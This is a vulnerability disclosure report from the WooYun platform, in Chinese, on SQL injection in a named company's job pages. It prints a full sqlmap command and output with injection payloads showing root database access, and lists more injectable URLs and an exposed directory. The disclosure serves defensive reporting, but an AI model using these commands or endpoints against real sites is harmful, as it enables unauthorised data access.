wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail: 漏洞详情 披露状态：   									2015-03-26：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-05-10：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 浩瀚深度官网sql注射漏洞，root权限 详细说明：  地址：http://www.haohandata.com.cn/job/job.php?class=9 class参数存在注入D:\Program Files\sqlmap\sqlmap\sqlmap1>sqlmap.py -u "http://www.haohandata.com.cn/job/job.php?class=9" -p class --c         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20140918}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the ends assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 18:52:02[18:52:02] [INFO] resuming back-end DBMS 'mysql'[18:52:02] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: class    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: class=9 AND 3230=3230    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: class=9 AND SLEEP(5)---[18:52:03] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.5.11, Apache 2.4.9back-end DBMS: MySQL 5.0.11[18:52:03] [INFO] fetching current user[18:52:03] [INFO] resumed: root@localhostcurrent user:    'root@localhost'[18:52:03] [INFO] fetched data logged to text files under 'C:\Users\kkk\.sqlmap\output\www.haohandata.com.cn'[*] shutting down at 18:52:03尝试写文件，一直写不成功，应该是目录没有写权限还有几处都有注入http://www.haohandata.com.cn/job/postjob.php?zhiwei=86http://www.haohandata.com.cn/job/post.php?id=1还有一处列目录:http://www.haohandata.com.cn/stations/   漏洞证明：  如上   修复方案：  过滤   版权声明：转载请注明来源 Aug0st@乌云
